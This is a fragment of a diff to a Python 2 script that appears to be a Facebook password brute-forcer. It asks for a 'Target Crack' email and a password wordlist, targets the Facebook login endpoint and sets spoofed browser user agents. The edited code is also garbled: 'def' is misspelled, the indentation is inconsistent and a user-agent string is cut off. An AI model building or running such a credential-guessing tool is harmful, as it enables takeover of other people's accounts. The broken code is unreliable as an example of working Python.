@@ -35,19 +35,19 @@ def runntek(s):
 
 
     
+de login():
+           email = str(raw_input(BB+"Target Crack... \033[33;1m: "))
 
-email = str(raw_input(BB+"Target Crack... \033[33;1m: "))
-
-passwordlist = str(raw_input(BB+" Code Password... \033[95m[ pass.txt ] \033[92;1m: "))
+           passwordlist = str(raw_input(BB+" Code Password... \033[95m[ pass.txt ] \033[92;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
 
 
-login = 'https://www.facebook.com/login.php?login_attempt=1'
+             login = 'https://www.facebook.com/login.php?login_attempt=1'
 
 
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+             useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 
 
 
@@ -136,3 +136,4 @@ def welcome():
 
 if __name__ == '__main__':
         main()
+        login ()
